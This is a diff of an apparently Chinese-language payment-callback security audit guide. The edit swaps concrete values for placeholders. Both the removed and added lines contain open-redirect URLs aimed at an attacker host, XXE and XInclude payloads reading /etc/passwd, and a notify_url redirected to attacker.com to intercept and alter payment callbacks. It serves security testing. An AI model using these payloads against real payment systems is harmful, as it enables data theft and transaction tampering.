@@ -728,11 +728,11 @@ def return_url_leak_test():
     """测试 return_url 是否会泄漏支付参数"""
     # 如果 return_url 可控且能做 Open Redirect:
     redirect_payloads = [
-        "https://attacker.com/steal",
-        "//attacker.com/steal",
-        "https://legit.com%40attacker.com/steal",
-        "https://legit.com#@attacker.com/steal",
-        "https://legit.com/redirect?url=https://attacker.com/steal",
+        "https://<attacker-domain>/steal",
+        "//<attacker-domain>/steal",
+        "https://legit.com%40<attacker-domain>/steal",
+        "https://legit.com#@<attacker-domain>/steal",
+        "https://legit.com/redirect?url=https://<attacker-domain>/steal",
     ]
 ```
 
@@ -872,7 +872,7 @@ XML_ATTACKS = {
     # XXE
     "xxe": """<?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY xxe SYSTEM "file://<sensitive-file>">
 ]>
 <xml><out_trade_no>&xxe;</out_trade_no></xml>""",
 
@@ -888,7 +888,7 @@ XML_ATTACKS = {
 
     # XInclude
     "xinclude": """<xml xmlns:xi="http://www.w3.org/2001/XInclude">
-<xi:include href="file:///etc/passwd" parse="text"/>
+<xi:include href="file://<sensitive-file>" parse="text"/>
 </xml>""",
 
     # XML Signature Wrapping (类似 SAML)
@@ -1135,12 +1135,12 @@ class PaymentCallbackAuditor:
     def check_xml_xxe(self):
         """XML XXE"""
         xxe = """<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://<sensitive-file>">]>
 <xml><out_trade_no>&xxe;</out_trade_no><trade_status>TRADE_SUCCESS</trade_status></xml>"""
         r = self._notify({}, content_type="application/xml", raw_data=xxe)
         if "root:" in r.text:
             self.findings.append(Finding("xxe", "critical",
-                "XXE returned /etc/passwd content", {}))
+                "XXE returned <sensitive-file> content", {}))
 
     def check_notify_url_ssrf(self):
         """notify_url SSRF"""
@@ -1468,9 +1468,9 @@ def http_callback_downgrade():
     r = S.post(BASE + "/api/pay", json={
         "order_id": "ORDER_ID",
         "amount": 0.01,
-        "notify_url": "http://attacker.com/intercept",
+        "notify_url": "http://<attacker-domain>/intercept",
     })
-    # 攻击者在 attacker.com 收到真实回调 → 修改金额 → 转发给目标
+    # 攻击者在 <attacker-domain> 收到真实回调 → 修改金额 → 转发给目标
 ```
 
 ### 18.2 HTTPS 证书校验绕过
